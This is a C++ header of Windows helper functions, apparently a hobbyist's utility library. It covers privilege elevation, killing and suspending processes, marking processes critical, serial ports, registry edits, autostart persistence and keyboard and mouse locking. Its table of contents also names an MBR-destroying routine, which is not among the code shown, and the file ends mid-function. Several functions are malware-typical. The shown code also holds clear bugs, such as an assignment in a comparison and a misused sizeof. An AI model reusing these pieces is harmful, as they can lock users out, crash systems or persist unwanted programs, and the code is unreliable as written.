/************************************** 
@brief 			 xbebhxx3函数合集
@license: 		 GPLv3 
@version  	     4.2
@author          xbehxx3
@date            2022/3/28
@class           类名
@file            x3-f.h
Copyright (c) 2022-2077 xbebhxx3
***************************************/
//能不要删除注释吗，求求了QwQ

/*****************目录*********************
x3-f.h
|- 权限操作
|	 |- 获得debug权限
|	 |- 判断管理员权限
|	 |- 获得管理员权限
|- 进程操作
|   |- 结束进程
|   |- 判断进程是否存在 ,并返回进程id
|   |- 获得进程路径
|   |- 挂起进程
|   |- 设置/解除关键进程
|- 串口操作
|    |- 打开串口
|    |- 关闭串口
|    |- 发送数据
|    |- 接收数据
|- 注册表操作
|     |- 读注册表 
|     |- 写注册表
|     |- 删除注册表项
|     |- 删除注册表值
|     |- 设置开机自启
|- 编/解码操作
|	   |- Url编码
|	   |- Url解码
|- 改变颜色
|    |- RGB初始化 
|    |- RGB设置
|- 锁定鼠标键盘
|- 获得鼠标位置
|- 清屏
|- str删除空格
|- 获得当前ip
|- 获得当前用户名
|- 获得系统版本
|- 执行cmd命令并获得返回值 
|- 居中输出 
|- 隐藏窗口
|- 真·全屏
|- 隐藏窗口
|- 破坏mbr 

 ****************************************/
 
//模板
/**********************************************
 *  @Sample usage:   使用实例 
 *  @brief           名字
 *  @param           函数参数
 *  @return          函数返回值描述
 *  @exception       函数抛异常描述
 *  @warning         函数使用中需要注意的地方
 *  @remarks         备注
 *  @note            详细描述
 *  @author          xbebhxx3
 *  @version         版本号
 *  @date            日期
 #  Copyright (c) 2022-2077 xbebhxx3
**********************************************/

#include <Windows.h> 
#include <TlHelp32.h>
#include <string>
#include <bits/stdc++.h>//没有实际作用，只是懒得打部分头文件 
#ifndef CIRCLE_H
#define CIRCLE_H

using namespace std;

//权限操作开始 

/******************************
 *  @brief     获得debug权限 
 *  @Sample usage: Debug(); 
 *  @return 	1成功，0失败 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2021/1/13
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
BOOL Debug(){
	HANDLE hToken;
	if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ALL_ACCESS,&hToken))return 0;
	LUID luid;
	if(!LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&luid))return 0;
	TOKEN_PRIVILEGES tkp;
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tkp.Privileges[0].Luid = luid;
	if(!AdjustTokenPrivileges(hToken,0,&tkp,sizeof(tkp),NULL,NULL))return 0;
	return 1;
}

/******************************
 *  @brief     判断管理员权限
 *  @param     NULL
 *  @Return: 1管理员，0不是
 *  @note      头文件： #include <Windows.h>
 *  @Sample usage: IsProcessRunAsAdmin();
 *  @author     xbebhxx3
 *  @version    2.0
 *  @date       2022/3/28
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
bool IsProcessRunAsAdmin() {
	BOOL bElevated = FALSE;  
	HANDLE hToken = NULL;  
	if ( !OpenProcessToken( GetCurrentProcess(), TOKEN_QUERY, &hToken ) )return FALSE;
	TOKEN_ELEVATION tokenEle;
	DWORD dwRetLen = 0;  
	if ( GetTokenInformation( hToken, TokenElevation, &tokenEle, sizeof(tokenEle), &dwRetLen ) ) if ( dwRetLen == sizeof(tokenEle) ) bElevated = tokenEle.TokenIsElevated; 

	CloseHandle( hToken );  
	return bElevated;  
}

/******************************
 *  @brief     获得管理员权限
 *  @param     NULL
 *  @Return: 1已经是管理员
 *  @note      头文件： #include <Windows.h>
 *  @Sample usage: RunAsAdmin(); 
 *  @remarks    必须依赖IsProcessRunAsAdmin判断是否为管理员权限 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2022/3/28 
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
bool RunAsAdmin(){
	if(IsProcessRunAsAdmin()==1)return 1;
	char szFilePath[MAX_PATH + 1] = { 0 };
	GetModuleFileNameA(NULL, szFilePath, MAX_PATH);
	ShellExecute(NULL, "runas",szFilePath,NULL,NULL, SW_SHOW);
	exit(0);
} 

//权限操作结束 

//进程操作开始 

/******************************
 *  @brief     结束进程
 *  @param     szImageName:进程名
 *  @note      头文件： #include <Windows.h> #include <TlHelp32.h> #include <string>
 *  @Sample usage:	KillProcess("cmd.exe");
 *  @author     xbebhxx3
 *  @version    2.0
 *  @date       2022/3/15
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
void KillProcess(char* szImageName) {
	PROCESSENTRY32 pe = {sizeof(PROCESSENTRY32) }; //获得进程列表
	HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//拍摄快照
	BOOL bRet = Process32First(hProcess,&pe);//检索快照中第一个进程信息
	while(bRet) { //判断不是最后一个进程，历遍所有
		if(lstrcmp(szImageName,pe.szExeFile)==0) {//判断是不是要结束的进程
			TerminateProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE,pe.th32ProcessID), 0);//打开进程并杀死
		}
		bRet = Process32Next(hProcess,&pe);//下一个进程
	}
	return;
}

/******************************
 *  @brief     判断进程是否存在 ,并返回进程id 
 *  @param     szImageName:进程名
 *  @note      头文件： #include <Windows.h> #include <TlHelp32.h> #include <string>
 *  @Sample usage:	isProcess("cmd.exe");
 * 	@Return: 	0不存在 非0为进程id 
 * 	@author     xbebhxx3
 * 	@version    1.0
 * 	@date       2022/3/15
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
int isProcess(char* szImageName) {
	PROCESSENTRY32 pe = {sizeof(PROCESSENTRY32) }; //获得进程列表 
	HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//拍摄快照 
	BOOL bRet = Process32First(hProcess,&pe);//检索快照中第一个进程信息 
	while(bRet){//不是最后一个进程，历遍所有
		if(lstrcmp(szImageName,pe.szExeFile)==0) return pe.th32ProcessID;
		bRet = Process32Next(hProcess,&pe);//下一个进程 
	} 
	return 0;
}	

/******************************
 *  @brief     获得进程路径 
 *  @param     szImageName:进程名
 *  @note      头文件： #include <Windows.h> #include <TlHelp32.h> #include <string>
 *  @Sample usage:	GetProcesslocation("cmd.exe");
 * 	@Return: 	进程位置
 *  @remarks    非必须依赖 isProcess判断进程是否存在 
 * 	@author     xbebhxx3
 * 	@version    1.0
 * 	@date       2022/5/18
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
string GetProcesslocation(char* szImageName){
	if(isProcess(szImageName)==0)return "0";
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0); // 创建进程快照
	PROCESSENTRY32 process = {sizeof(PROCESSENTRY32)};	// 用来接收 hProcessSnap 的信息	
	while (Process32Next(hProcessSnap,&process)){// 遍历进程快照
		string processName = process.szExeFile; // char* 转 string
		if(processName == szImageName){// 找到 进程
				//获得进程路径 
				PROCESSENTRY32* pinfo = new PROCESSENTRY32; //进程信息 （pinfo->dwSize = sizeof(PROCESSENTRY32);）
				MODULEENTRY32* minfo = new MODULEENTRY32; //模块信息 （minfo->dwSize = sizeof(MODULEENTRY32);）
			    char shortpath[MAX_PATH];				//保存路径变量
				int flag = Process32First(hProcessSnap,pinfo);	// 从第一个进程开始
			    while(flag){
					if(strcmp(pinfo->szExeFile, szImageName) == 0){	// 如果是这个进程
						HANDLE hModule = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,pinfo->th32ProcessID); // 创建进程快照
						Module32First(hModule,minfo);  // 把第一个模块信息给 minfo  
						GetShortPathName(minfo->szExePath,shortpath,256); // 把文件路径给 shortpath
						break;
					}
					flag = Process32Next(hProcessSnap, pinfo);// 下一个进程
			    }
			return shortpath;
			break;
		}
	}
}

/******************************
 *  @brief     挂起进程 
 *  @param     dwProcessID:进程ID,fSuspend: TRUE挂起,FALSE解除 
 *  @note      头文件： #include <Windows.h> #include <TlHelp32.h>
 *  @Sample usage:	SuspendProcess(isProcess("cmd.exe"),1);
 * 	@Return: 	1成功，0 失败
 * 	@author     xbebhxx3
 * 	@version    1.0
 * 	@date       2022/5/18
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
bool SuspendProcess(DWORD dwProcessID, BOOL fSuspend){  
	bool ret=1;
	Debug();
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcessID);  
    if (hSnapshot != INVALID_HANDLE_VALUE) {  
        THREADENTRY32 te = {sizeof(te)};  
        BOOL fOk = Thread32First(hSnapshot, &te);  
        for (; fOk; fOk = Thread32Next(hSnapshot, &te))if (te.th32OwnerProcessID == dwProcessID) {  
            if (fSuspend){
            	if(SuspendThread(OpenThread(THREAD_SUSPEND_RESUME,FALSE, te.th32ThreadID))==-1)ret=0;  
			} 
            else {
            	if(ResumeThread(OpenThread(THREAD_SUSPEND_RESUME,FALSE, te.th32ThreadID))==-1)ret=0;
			}  
        }  
        CloseHandle(OpenThread(THREAD_SUSPEND_RESUME,FALSE, te.th32ThreadID));  
    }  
	CloseHandle(hSnapshot);  
	return ret;
}  

/******************************
 *  @brief     设置/解除关键进程 
 *  @param     id:进程id ,fSuspend:1关键，0普通 
 *  @note      头文件： #include <Windows.h> #include <TlHelp32.h>
 *  @Sample usage:	CriticalProcess(1000,1);
 * 	@Return: 	1成功，0失败 
 *  @remarks    必须依赖 Debug() 提权 
 * 	@author     xbebhxx3
 * 	@version    1.0
 * 	@date       2022/3/28
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
typedef NTSTATUS(NTAPI *_NtSetInformationProcess)(HANDLE ProcessHandle,PROCESS_INFORMATION_CLASS ProcessInformationClass,PVOID ProcessInformation,ULONG ProcessInformationLength);
bool CriticalProcess(DWORD dwProcessID, BOOL fSuspend){
	Debug();
	_NtSetInformationProcess NtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtSetInformationProcess");
	if (!NtSetInformationProcess) return 0;
	if(NtSetInformationProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID), (PROCESS_INFORMATION_CLASS)29, &fSuspend, sizeof(ULONG))<0)return 0;
	else return 1;
}


//进程操作结束 

//串口操作开始 

/******************************
 *  @brief 串口操作 
 	SerialPort w;//使用，不是必须用w
	w.open("\\\\.\\COM7");//打开COM7 不是必须用COM7 
	w.close()//关闭
	w.send("at\r");//发送 
	w.receive()；//接收 
 *  @note      头文件： #include <Windows.h>
 * 	@author     xbebhxx3
 * 	@version    5.0
 * 	@date       2022/8/12
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
class SerialPort
{
public:
	SerialPort();
	~SerialPort();
	bool open(const char* portname,int baudrate,char parity,char databit,char stopbit,char synchronizeflag);// 打开串口,成功返回true，失败返回false
	void close();//关闭串口
	int send(string dat);//发送数据或写数据，成功返回发送数据长度，失败返回0
	string receive();//接收数据或读数据，成功返回读取实际数据的长度，失败返回0
private:
	int pHandle[16];
	char synchronizeflag;
};
SerialPort::SerialPort(){}
SerialPort::~SerialPort(){}
/******************************
 *  @brief     打开串口 
 *  @param     
 	portname(串口名): 在Windows下是"COM1""COM2"等，在Linux下是"/dev/ttyS1"等
	baudrate(波特率): 9600、19200、38400、43000、56000、57600、115200 
	parity(校验位): 0为无校验，1为奇校验，2为偶校验，3为标记校验
	databit(数据位): 4-8，通常为8位
	stopbit(停止位): 1为1位停止位，2为2位停止位,3为1.5位停止位
	synchronizable(同步、异步): 0为异步，1为同步
 *  @note      非独立模块
 *  @Sample usage:	open(端口号);
 * 	@Return: 	成功返回true，失败返回false
 * 	@author     xbebhxx3
 * 	@version    2.0
 * 	@date       2022/8/13
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
bool SerialPort::open(const char* portname, int baudrate = 115200, char parity = 0, char databit = 8, char stopbit = 1, char synchronizeflag = 1){
	this->synchronizeflag = synchronizeflag;
	HANDLE hCom = NULL;
	if (this->synchronizeflag) hCom = CreateFileA(portname,GENERIC_READ | GENERIC_WRITE,0,NULL,OPEN_EXISTING,0, NULL);//同步方式
	else hCom = CreateFileA(portname,GENERIC_READ | GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_FLAG_OVERLAPPED,NULL);//异步方式
	if (hCom == (HANDLE)-1) return false;
	if (!SetupComm(hCom, 1024, 1024))return false;//配置缓冲区大小
	// 配置参数 
	DCB p;
	memset(&p, 0, sizeof(p));
	p.DCBlength = sizeof(p);
	p.BaudRate = baudrate; // 波特率
	p.ByteSize = databit; // 数据位
	switch (parity) //校验位
	{
	case 0:
		p.Parity = NOPARITY; //无校验
		break;
	case 1:
		p.Parity = ODDPARITY; //奇校验
		break;
	case 2:
		p.Parity = EVENPARITY; //偶校验
		break;
	case 3:
		p.Parity = MARKPARITY; //标记校验
		break;
	}
	switch (stopbit) //停止位
	{
	case 1:
		p.StopBits = ONESTOPBIT; //1位停止位
		break;
	case 2:
		p.StopBits = TWOSTOPBITS; //2位停止位
		break;
	case 3:
		p.StopBits = ONE5STOPBITS; //1.5位停止位
		break;
	}
	if (!SetCommState(hCom, &p)) return false;// 设置参数失败
	COMMTIMEOUTS TimeOuts;//超时处理,单位：毫秒，总超时＝时间系数×读或写的字符数＋时间常量
	TimeOuts.ReadIntervalTimeout = 1000; //读间隔超时
	TimeOuts.ReadTotalTimeoutMultiplier = 500; //读时间系数
	TimeOuts.ReadTotalTimeoutConstant = 5000; //读时间常量
	TimeOuts.WriteTotalTimeoutMultiplier = 500; // 写时间系数
	TimeOuts.WriteTotalTimeoutConstant = 2000; //写时间常量
	SetCommTimeouts(hCom, &TimeOuts);
	PurgeComm(hCom, PURGE_TXCLEAR | PURGE_RXCLEAR);//清空串口缓冲区
	memcpy(pHandle, &hCom, sizeof(hCom));// 保存句柄
	return true;
}

/******************************
 *  @brief     关闭串口 
 *  @param     NULL
 *  @note      非独立模块 
 *  @Sample usage:	open(端口号);
 * 	@Return: 	成功返回true，失败返回false
 * 	@author     xbebhxx3
 * 	@version    1.0
 * 	@date       2022/8/13
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
void SerialPort::close(){
	HANDLE hCom = *(HANDLE*)pHandle;
	CloseHandle(hCom);
}

/******************************
 *  @brief     发送数据
 *  @param     dat:发送的数据 
 *  @note      非独立模块 
 *  @Sample usage:	send(发送的数据);
 * 	@Return: 	成功返回发送数据长度，失败返回0
 * 	@author     xbebhxx3
 * 	@version    1.0
 * 	@date       2022/8/13
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
int SerialPort::send(string dat){
	HANDLE hCom = *(HANDLE*)pHandle;
	if (this->synchronizeflag){// 同步方式
		DWORD dwBytesWrite = dat.length(); //成功写入的数据字节数
		BOOL bWriteStat = WriteFile(hCom,(char*)dat.c_str(),dwBytesWrite,&dwBytesWrite,NULL);//同步发送
		if (!bWriteStat) return 0;
		return dwBytesWrite;
	}
	else{//异步方式
		DWORD dwBytesWrite = dat.length(); //成功写入的数据字节数
		DWORD dwErrorFlags; //错误标志
		COMSTAT comStat; //通讯状态
		OVERLAPPED m_osWrite; //异步输入输出结构体
		memset(&m_osWrite, 0, sizeof(m_osWrite));//创建一个用于OVERLAPPED的事件处理，不会真正用到，但系统要求这么做
		ClearCommError(hCom, &dwErrorFlags, &comStat); //清除通讯错误，获得设备当前状态
		BOOL bWriteStat = WriteFile(hCom,(char*)dat.c_str(),dwBytesWrite,&dwBytesWrite,&m_osWrite); //异步发送
		if (!bWriteStat) if (GetLastError() == ERROR_IO_PENDING) WaitForSingleObject(m_osWrite.hEvent, 500); //如果串口正在写入等待写入事件0.5秒钟
		else{
			ClearCommError(hCom, &dwErrorFlags, &comStat); //清除通讯错误
			CloseHandle(m_osWrite.hEvent); //关闭并释放hEvent内存
			return 0;
		}
		return dwBytesWrite;
	}
}

/******************************
 *  @brief     接收数据
 *  @param     NULL
 *  @note      非独立模块 
 *  @Sample usage:	receive();
 * 	@Return: 	数据
 * 	@author     xbebhxx3
 * 	@version    3.0
 * 	@date       2022/8/13
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
string SerialPort::receive(){
	HANDLE hCom = *(HANDLE*)pHandle;
	string rec_str = "";
	char buf[1024];
	if (this->synchronizeflag){//同步方式
		DWORD wCount=1024; //成功读取的数据字节数
		BOOL bReadStat = ReadFile(hCom,buf,wCount,&wCount,NULL); //同步接收
		for (int i = 0; i < strlen(buf); i++){
			if (buf[i] != -52)rec_str += buf[i];				
			else break;
		}
		return rec_str;
	}
	else{//异步方式
		DWORD wCount = 1024; //成功读取的数据字节数
		DWORD dwErrorFlags; //错误标志
		COMSTAT comStat; //通讯状态
		OVERLAPPED m_osRead; //异步输入输出结构体
		memset(&m_osRead, 0, sizeof(m_osRead));//创建一个用于OVERLAPPED的事件处理，不会真正用到，但系统要求这么做
		ClearCommError(hCom, &dwErrorFlags, &comStat); //清除通讯错误，获得设备当前状态
		if (!comStat.cbInQue)return ""; //如果输入缓冲区字节数为0，则返回false
		BOOL bReadStat = ReadFile(hCom,buf,wCount,&wCount,&m_osRead); //异步接收 
		if (!bReadStat){
			if (GetLastError() == ERROR_IO_PENDING)GetOverlappedResult(hCom, &m_osRead, &wCount, TRUE);//如果串口正在读取中，GetOverlappedResult函数的最后一个参数设为TRUE，函数会一直等待，直到读操作完成或由于错误而返回
			else{
				ClearCommError(hCom, &dwErrorFlags, &comStat); //清除通讯错误
				CloseHandle(m_osRead.hEvent); //关闭并释放hEvent的内存
				return "";
			}
		}
		for (int i = 0; i < strlen(buf); i++){
			if (buf[i] != -52)rec_str += buf[i];
			else break;
		}
		return rec_str;
	}
}
//串口操作结束 

//注册表操作开始 

/******************************
 *  @brief     读注册表
 *  @param     path:路径 key：key
 *  @note      头文件： #include <windows.h>
 *  @Sample usage: ReadReg("Software\\xbebhxx3", "aaa");
 *  @ Return:   注册表值，0为失败 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2022/3/28 
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
char* ReadReg(const char* path, const char* key)
{
	static char value[32]={0};
	HKEY hKey;
	int ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_EXECUTE, &hKey);
	if (ret != ERROR_SUCCESS)return 0;
	//读取KEY
	DWORD dwType = REG_SZ; //数据类型
	DWORD cbData = 256;
	ret = RegQueryValueEx(hKey, key, NULL, &dwType, (LPBYTE)value, &cbData);
	if (ret == ERROR_SUCCESS)return value;
	RegCloseKey(hKey);
	return 0;
}
/******************************
 *  @brief     写注册表
 *  @param     path:路径 key：key, value：值 
 *  @note      头文件： #include <windows.h>
 *  @Sample usage: WriteReg("Software\\xbebhxx3", "aaa", "bbb");
 *  @ Return:   1成功，0失败 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2022/3/28 
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
bool WriteReg(const char* path, const char* key, const char* value)
{
	HKEY hKey;
	DWORD dwDisp;
	DWORD dwType = REG_SZ; //数据类型
	int ret = RegCreateKeyEx(HKEY_LOCAL_MACHINE, path,0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisp);
	if (ret != ERROR_SUCCESS){
		RegCloseKey(hKey);
		return 0;
	}
	ret == RegSetValueEx(hKey, key, 0, dwType, (BYTE*)value, strlen(value));
	RegCloseKey(hKey);
	return 1;
}
 
/******************************
 *  @brief     删除注册表项 
 *  @param     path:路径
 *  @note      头文件： #include <windows.h>
 *  @Sample usage: DelReg("Software\\xbebhxx3");
 *  @ Return:   1成功，0失败 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2022/3/28 
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
bool DelReg(const char* path)
{
	int ret = RegDeleteKey(HKEY_LOCAL_MACHINE, path);
	if (ret == ERROR_SUCCESS)return 1; 
	else return 0;
}

/******************************
 *  @brief     删除注册表值 
 *  @param     path:路径, value：值 
 *  @note      头文件： #include <windows.h>
 *  @Sample usage: DelReg("Software\\xbebhxx3","aaa");
 *  @ Return:   1成功，0失败 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2022/3/28 
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
bool DelRegValue(const char* path,const char* Value){
    HKEY hKey;                               
    LONG ret = RegOpenKeyEx( HKEY_LOCAL_MACHINE,path,0, KEY_QUERY_VALUE| KEY_WRITE, &hKey );                               
    if( ret == ERROR_SUCCESS ){
		RegDeleteValue(hKey,Value);
		return 1;
	} 
    return 0;
    RegCloseKey(hKey);
}

/******************************
 *  @brief     设置开机自启 
 *  @param     name:程序名，fSuspend:1开启，0关闭 
 *  @note      头文件： #include <windows.h>
 *  @Sample usage: AutoRun(程序名，1); 
 *  @author     xbebhxx3
 *  @version    2.0
 *  @date       2021/10/4 
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
void AutoRun(const char* name,BOOL fSuspend) {
	if(fSuspend==1){
		char szFilePath[MAX_PATH + 1] = { 0 };
		GetModuleFileNameA(NULL, szFilePath, MAX_PATH);
		WriteReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",name,szFilePath);
	}else{
		DelRegValue("Software\\Microsoft\\Windows\\CurrentVersion\\Run",name);
	}
}

//注册表操作结束 

//编/解码操作开始 

/******************************
 *  @brief     Url编码 
 *  @param     需要编码的东西 
 *  @Sample usage: CodeUrl(需要编码的东西); 
 *  @return 	编码后的 
 *  @author     xbebhxx3
 *  @version    2.0
 *  @date       2021/10/14 
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
string CodeUrl(const string &URL){
	string result = "";
	for ( unsigned int i=0; i<URL.size(); i++ ) {
		char c = URL[i];
		if (( '0'<=c && c<='9' ) ||( 'a'<=c && c<='z' ) ||( 'A'<=c && c<='Z' ) ||c=='/' || c=='.') result += c;
		else {
			int j = (short int)c;
			if ( j < 0 ) j += 256;
	   		int i1, i0;
	   		i1 = j / 16;
	   		i0 = j - i1*16;
	   		result += '%';
			if ( 0 <= i1 && i1 <= 9 ) result += char( short('0') + i1 );
			else if ( 10 <= i1 && i1 <= 15 ) result += char( short('A') + i1 - 10 );
			if ( 0 <= i0 && i0 <= 9 ) result += char( short('0') + i0 );
			else if ( 10 <= i0 && i0 <= 15 ) result += char( short('A') + i0 - 10 );
		}
	}
 return result;
}
 
/******************************
 *  @brief     Url解码 
 *  @param     需要解码的东西 
 *  @Sample usage: decodeUrl(需要解码的东西); 
 *  @return 	解码后的 
 *  @author     xbebhxx3
 *  @version    2.0
 *  @date       2021/10/14 
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
string DecodeUrl(const string &URL) {
	string result = "";
	for (unsigned int i=0;i<URL.size();i++) {
		char c = URL[i];
		if ( c != '%' ) result += c;
	 	else {
			char c1 = URL[++i];
			char c0 = URL[++i];
			int num = 0;
			if ( '0'<=c1 && c1<='9' ) num += short(c1-'0')* 16;
			else if ( 'a'<=c1 && c1<='f' ) num += ( short(c1-'a') + 10 )* 16;
			else if ( 'A'<=c1 && c1<='F' ) num += ( short(c1-'A') + 10 )* 16;
			if ( '0'<=c0 && c0<='9' ) num += short(c0-'0');
			else if ( 'a'<=c0 && c0<='f' ) num += ( short(c0-'a') + 10 );
			else if ( 'A'<=c0 && c0<='F' ) num += ( short(c0-'A') + 10 );
			result += char(num);
		}
 }
 return result;
}

/******************************
 *  @brief     加密
 *  @param     需要加密的东西 
 *  @Sample usage: x3code(需要加密的东西); 
 *  @return 	加密后的 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2022/3/30 
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
string x3code(string c){
	for(int i=0;i<=sizeof(c);i++){
	if((c[i]>='A'&&c[i]<='V')||(c[i]>='a'&&c[i]<='v')){
		c[i]=(c[i]^8)+4; 
	}else if((c[i]>='W'&&c[i]<='Z')||(c[i]>='w'&&c[i]<='z')){
		c[i]=(c[i]^6)-22;
	}else if((c[i]>='1'&&c[i]<='4')){
		c[i]=(c[i]^4)-8;
	}else if((c[i]>='5'&&c[i]<='9')){
		c[i]=(c[i]^7)+22;
	}else if((c[i]>=' '&&c[i]<='(')){
		c[i]=(c[i]^2)-21;
	}else if((c[i]>=')'&&c[i]<='/')){
		c[i]=(c[i]^3)+12;
	}else;
	}
	return c;
}
//编码操作结束 

//改变颜色开始

/******************************
 *  @brief      RGB初始化 
 *  @Sample usage: rgb_init()
*  @note		头文件： #include<Windows.h>
 *  @author     jlx
 *  @version    1.0
 *  @date       2022/3/5 
******************************/
void rgb_init() {																// 初始化
	HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);		//输入句柄
	HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);		//输出句柄
	DWORD dwInMode, dwOutMode;
	GetConsoleMode(hIn, &dwInMode);						//获取控制台输入模式
	GetConsoleMode(hOut, &dwOutMode);					//获取控制台输出模式
	dwInMode |= 0x0200;									//更改
	dwOutMode |= 0x0004;
	SetConsoleMode(hIn, dwInMode);						//设置控制台输入模式
	SetConsoleMode(hOut, dwOutMode);					//设置控制台输出模式
}

/******************************
 *  @brief      RGB设置
 *  @param		wr:字体红,wg:字体绿,wb:字体蓝,br:背景红,bg:背景绿,bb:背景蓝 (0-255) 
 *  @Sample usage: rgb_set(255,255,255,0,0,0);
 *  @note		在这之前先运行 rgb_init(); 
 *  @author     jlx
 *  @version    1.0
 *  @date       2022/3/5 
******************************/
void rgb_set(int wr,int wg,int wb,int br,int bg,int bb) {
	printf("\033[38;2;%d;%d;%dm\033[48;2;%d;%d;%dm",wr,wg,wb,br,bg,bb);	//\033[38表示前景，\033[48表示背景，三个%d表示混合的数
}

//改变颜色结束
 
/******************************
 *  @brief     锁定鼠标键盘 (需要管理员权限)
 *  @param     NULL
 *  @Return:    1成功，0失败 
 *  @note      头文件： #include <Windows.h>
 *  @Sample usage: lockkm(1); 锁定，lockkm(0); 解锁 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2022/3/28 
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
bool lockkm(bool lockb=false){
	HINSTANCE hIn = NULL;
	hIn = LoadLibrary("user32.dll");
	if(hIn){
        BOOL (_stdcall *BlockInput)(BOOL bFlag);
        BlockInput = (BOOL (_stdcall *)(BOOL bFlag)) GetProcAddress(hIn, "BlockInput");
        if (BlockInput) return BlockInput(lockb);
        else return 0;
    }else return 0;
}

/******************************
 *  @brief     获得鼠标位置 
 *  @param     NULL
 *  @note      头文件： #include <Windows.h>
 *  @Sample usage: mouxy(鼠标x坐标，y坐标); 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2021/5/2
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
void mouxy(int &x,int &y) {
	POINT p;
	GetCursorPos(&p);//获取鼠标坐标
	x=p.x;
	y=p.y;
}

/******************************
 *  @brief     清屏 
 *  @param     NULL
 *  @note      头文件： #include <Windows.h>
 *  @Sample usage: cls(); 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2021/9/14
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
 void cls() {
    HANDLE hdout = GetStdHandle(STD_OUTPUT_HANDLE);    //获取标准输出设备的句柄
    CONSOLE_SCREEN_BUFFER_INFO csbi;    //定义表示屏幕缓冲区属性的变量
    GetConsoleScreenBufferInfo(hdout, &csbi);  //获取标准输出设备的屏幕缓冲区属性
    DWORD size = csbi.dwSize.X * csbi.dwSize.Y, num = 0; //定义双字节变量
    COORD pos = {0, 0};    //表示坐标的变量（初始化为左上角(0, 0)点）
    //把窗口缓冲区全部填充为空格并填充为默认颜色（清屏）
    FillConsoleOutputCharacter(hdout, ' ', size, pos, &num);
    FillConsoleOutputAttribute (hdout, csbi.wAttributes, size, pos, &num );
    SetConsoleCursorPosition(hdout, pos);    //光标定位到窗口左上角
}

/******************************
 *  @brief     str删除空格 
 *  @param     s:要删除空格的string变量 
 *  @note      头文件： #include <Windows.h>
 *  @Sample usage: delspace(要删除空格的string变量); 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2021/9/14
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
 void delspace(string &s)
{
	int index = 0;
	if( !s.empty())while( (index = s.find(' ',index)) != string::npos) s.erase(index,1);
 }

/******************************
 *  @brief     获得当前ip 
 *  @note      头文件： #include <WinSock2.h>	编译时加-lgdi32 -lwsock32 
 *  @Sample usage: ip(); 
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2021/9/23
 #  Copyright (c) 2021-2077 xbebhxx3
******************************/
string ip(){
	WSADATA wsaData;
    int ret = WSAStartup(MAKEWORD(2, 2), &wsaData);
    char hostname[256];
    ret = gethostname(hostname, sizeof(hostname));
    HOSTENT* host = gethostbyname(hostname);
    return inet_ntoa(*(in_addr*)*host->h_addr_list);
} 

/******************************
 *  @brief     获得当前用户名 
 *  @Sample usage: GetUser(); 
 *  @return 	当前用户名
  *  @note		头文件： #include<Windows.h>
 *  @author     xbebhxx3
 *  @version    1.0
 *  @date       2022/2/28 
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
string GetUser(){
	char currentUser[256]={0};
	DWORD dwSize_currentUser = 256;
	GetUserName(currentUser,&dwSize_currentUser);
	return currentUser; 
}

/******************************
 *  @brief     获得系统版本 
 *  @Sample usage: GetSystemVersion(); 
 *  @return 	系统版本 
 *  @note		头文件： #include<Windows.h>
 *  @author     xbebhxx3
 *  @version    4.0
 *  @date       2021/2/24 
 #  Copyright (c) 2022-2077 xbebhxx3
******************************/
string GetSystemVersion (){
	OSVERSIONINFO osv = {0};
	osv.dwOSVersionInfoSize = sizeof(osv);
	if(!GetVersionEx(&osv))return 0;
	else if(osv.dwMajorVersion = 10 && osv.dwMinorVersion ==0)return "Windows 10";//or windows server 2016
